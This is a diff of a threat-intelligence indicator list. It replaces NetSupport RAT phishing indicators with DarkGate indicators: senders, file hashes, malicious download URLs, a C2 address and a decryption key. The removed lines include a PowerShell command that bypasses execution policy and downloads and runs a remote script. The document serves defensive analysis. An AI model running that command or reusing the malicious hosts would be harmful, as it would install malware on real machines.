@@ -1,58 +1,80 @@
-THREAT IDENTIFICATION: NETSUPPORT RAT
+THREAT IDENTIFICATION:  DARKGATE
+ 
+OBSERVED SENDERS
+Donald Parsons <samer@asiatribune.co>
+Gertrude Charles <info@dbnetdesign.com>
 
-SUBJECTS OBSERVED
-Confirmation  #75556WKA
-Confirmation  #8945335HZWW
-Confirmation #337335CNJ
-Confirmation #3741954DCP
-Confirmation #61433679DYP
-Confirmation #65912VWY
-Confirmation #69224342HWA
-Confirmation #75556WKA
-Confirmation #7571741UYMI
-Confirmation #8945335HZWW
-Confirmation #963646FTGS
+OBSERVED SUBJECTS
+claim:8341TVAW2961
+claim:4784PKCM5135
 
-SENDERS OBSERVED
-accountings@cashlez.com
+PDF FILE HASHES
+res_-26-1009-9774135792.pdf
+63d9be606d3f6dbb6730decba88daecc
 
-URL FROM THE EMAIL
-http://r.infocashlez.com/tr/cl/TpbUh9cBRwuZLT5asFkBnD3NW0uvFkQ1475mkZrNZQVmEDXS5AFfk6GKlqMgT-9Sua0PYB-3uvQhG58VfTMJugmdLWFkMEyhfwibX8RfKo0HEU_qwOJ-TP_Ah7CfoDR0-S2ydcchuPfJPSyB1CQlkXE8s84CdWkQ8VBbd79nLJp_Sxw4vtgyNX9fZBvveEeUKnPgrkXh6ln_Pbeni82G0VYJTYEYHvVD-ZUnhsOVpegU56xDw6CKYMkAJRS1lKztpn0fBYXvjQJ_wOyKWrP7lqRs8NdL4A
+claim-26-1768-0694838439.pdf
+ffa5f25e8f43da956fe2c767450755df
 
-LANDING PAGE URL
-https://wrinovacoes.com.br/inview.php?txid=596916
+KEITARO TDS URL FROM PDF
+https://adclick.g.doubleclick.net//pcs/click?f1466ndc1-24-YrMhOONENckd&&adurl=https://www.paradiseoutlaw.com/?utm_content=KSvsFzqzgm&session_id=RNPjy0Cp5WFZKMgwXUYL&id=3vP2z&filter=BuWLYhqjNa-AztOl&lang=fr&locale=US
 
-JAVASCRIPT FILE REDIRECT URL
-https://chateauauvergnefrance.com/wp/re/
+NEXT STAGE REDIRECT URL
+https://www.paradiseoutlaw.com/?utm_content=KSvsFzqzgm
 
-REFRESH TAG
-<meta http-equiv='refresh' content='1;url=https://UTC-opensocial.googleusercontent.com/gadgets/ifr?url=https://chateauauvergnefrance.com/wp/zez/inv'>
+CAB FILE DOWNLOAD URL
+https://aakritifitness.com/wp-content/uploads/mailpoet/January-26-2024-FREPDCA.cab
 
-NEXT STAGE JAVASCRIPT REDIRECT URL
-https://utc-opensocial.googleusercontent.com/gadgets/ifr?url=https://chateauauvergnefrance.com/wp/zez/inv
+CAB FILE HASH
+January-26-2024-FREPDCA.cab
+ecd1fbabc40ccb73838698115b5ac5fa
 
-JAVASCRIPT FILE DOWNLOAD URL
-https://chateauauvergnefrance.com/wp/zez/inv
+CAB FILE CONTENTS
+January-26-2024-FREPDCA.url
+9658eb436ba93bdf9c14a2a9a100ce6e
 
-JAVASCRIPT FILE HASH
-IN4912.js
-7843c4c02634bca24ee02770be2dc75c
+And a file named "DOCUSIGN (security-extract).txt" which is 0 bytes
 
-IN8339.js
-ac22d2ceedcc9c63518642f434aeedee
+FIRST URL FILE  PROPERTIES
+file://5.181.159.77@80/Downloads/Betterr.url
 
-PASSWORD FROM THE LANDING PAGE
-Jan23
-(not needed)
+NEXT STAGE DOWNLOAD URLS
+http://5.181.159.77/Downloads/Betterr.url
 
-INTERCEPTED POWERSHELL COMMAND
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://hsdiagnostico.com/readme.php')"
+SECOND URL FILE HASH
+Betterr.url
+bbabc06dd73deded03aa5473fe30f229
 
-LIKELY PAYLOAD DOWNLOAD URL
-https://hsdiagnostico.com/readme.php
-(Returns 404)
+SECOND URL PROPERTIES
+file://5.181.159.77@80/Downloads/doingprettywellthisjob.zip/doingprettywellthisjob.msi
 
+MSI FILE DOWNLOAD URL
+http://5.181.159.77/Downloads/doingprettywellthisjob.zip
+http://5.181.159.77/Downloads/doingprettywellthisjob.zip/doingprettywellthisjob.msi
 
+MSI FILE HASH
+doingprettywellthisjob.msi
+2256ae832551af3db0925b280364f25b
 
+AUTOIT EXECUTABLE FILE HASH (Legitimate file)
+Autoit3.exe
+c56b5f0201a3b3de53e561fe76912bfd
 
+AUTOIT SCRIPT FILE HASH
+script.au3
+eba524e5953e67b13e6815b14a1f0a57
+
+TEXT FILE HASH
+test.txt
+5165ddbdb0a572e6a815cbdeeb8d0df5
+(This contains what seems to be a decryption key of some sort)
+
+KEY FROM TEXT FILE
+sU2}"dqm7g5STD9=wXhQpN]He$aK0YELuI*M&6Cyr1Pk[{c3tRJ.i,ljb8OWvV4zFZnfB)Ao G(x
+
+DARKGATE C2s
+http://lili19mainmasters.com:8094
+
+REFERENCES
+https://medium.com/s2wblog/detailed-analysis-of-darkgate-investigating-new-top-trend-backdoor-malware-0545ecf5f606
+https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html
 
